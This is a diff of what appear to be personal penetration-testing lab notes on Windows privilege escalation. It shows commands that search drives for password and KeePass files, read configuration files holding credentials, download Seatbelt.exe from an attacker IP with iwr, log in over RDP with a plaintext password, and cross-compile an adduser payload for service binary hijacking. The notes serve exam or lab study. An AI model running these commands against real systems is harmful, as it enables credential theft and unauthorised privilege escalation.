@@ -90,13 +90,13 @@ ls -Hidden
 
 search for files that may have passwords etc
 ```
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\windows.old -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\SQL2019 -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 type C:\xampp\mysql\bin\my.ini
 type C:\xampp\passwords.txt
-Get-ChildItem -Path C:\Users\zachary\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\windows.old\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
 
 Get-ChildItem -Path C:\staging\htdocs -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.conf.bak -File -Recurse -ErrorAction SilentlyContinue
 
@@ -191,6 +191,7 @@ iwr -uri http://192.168.45.219/Seatbelt.exe.1 -Outfile seatbelt.exe
 service binary hijacking VM1
 ```
 xfreerdp /u:daveadmin /p:qwertqwertqwert123\!\! /v:192.168.212.220 /w:1200 /h:700
+
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName
@@ -203,7 +204,9 @@ icacls "C:\xampp\mysql\bin\mysqld.exe"
 ```
 
 create adduser.c on kali and cross-compile
-`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+```
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
 
 transfer to windows by serving it up using python server
 
